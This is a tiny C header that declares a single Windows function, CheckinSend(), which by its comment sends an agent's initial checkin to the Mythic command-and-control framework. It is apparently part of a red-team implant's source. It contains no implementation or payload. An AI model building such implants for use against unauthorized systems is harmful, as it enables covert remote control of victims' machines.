#ifndef CHECKIN_H
#define CHECKIN_H

#include <stdbool.h>
#include <windows.h>

// Sends the initial checkin to Mythic
// Returns TRUE if checkin was successful (and UUID potentially updated)
BOOL CheckinSend();

#endif
